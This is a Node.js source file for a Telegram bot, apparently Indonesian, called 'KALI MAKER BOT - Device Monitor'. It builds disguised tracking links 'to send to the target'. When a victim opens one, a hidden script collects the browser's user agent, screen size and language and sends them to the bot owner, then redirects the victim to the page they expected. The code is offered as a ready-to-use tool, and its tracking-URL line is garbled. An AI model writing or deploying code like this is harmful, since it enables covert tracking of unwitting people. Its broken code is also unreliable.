require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const app = express();

app.use(express.json());

const bot = new Telegraf(process.env.BOT_TOKEN);
const TRACKS = new Map();

bot.command('start', async (ctx) => {
    await ctx.replyWithMarkdown(
        `🔥 *KALI MAKER BOT - Device Monitor*\n\nPilih fitur:`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📍 Device Monitor', 'device_monitor')]
        ])
    );
});

bot.action('device_monitor', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `📍 *Kirim URL Website yang Ingin di Clone*\n\nContoh: https://example.com`,
        Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'back')]])
    );
});

bot.on('text', async (ctx) => {
    const url = ctx.message.text;
    if (!url.startsWith('http')) return ctx.reply('❌ Masukkan URL yang valid!');

    const trackId = Math.random().toString(36).substring(2, 10);
    const trackUrl = `https://\( {process.env.RAILWAY_STATIC_URL || 'domain-kamu'}/track/ \){trackId}`;

    TRACKS.set(trackId, { url, data: [] });

    await ctx.reply(
        `✅ *Link Tracking Siap!*\n\nKirim ke target:\n\`${trackUrl}\``,
        { parse_mode: 'Markdown' }
    );
});

app.get('/track/:id', (req, res) => {
    const html = `
    <script>
        fetch('/capture/${req.params.id}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip: 'Fetching...',
                device: navigator.userAgent,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language
            })
        });
        window.location.href = "${TRACKS.get(req.params.id)?.url || '#'}";
    </script>`;
    res.send(html);
});

app.post('/capture/:id', (req, res) => {
    const data = req.body;
    console.log('📍 Data Captured:', data);
    bot.telegram.sendMessage(process.env.OWNER_ID, `📍 *Device Captured*\n${JSON.stringify(data, null, 2)}`);
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Bot running on ${PORT}`));

bot.launch();
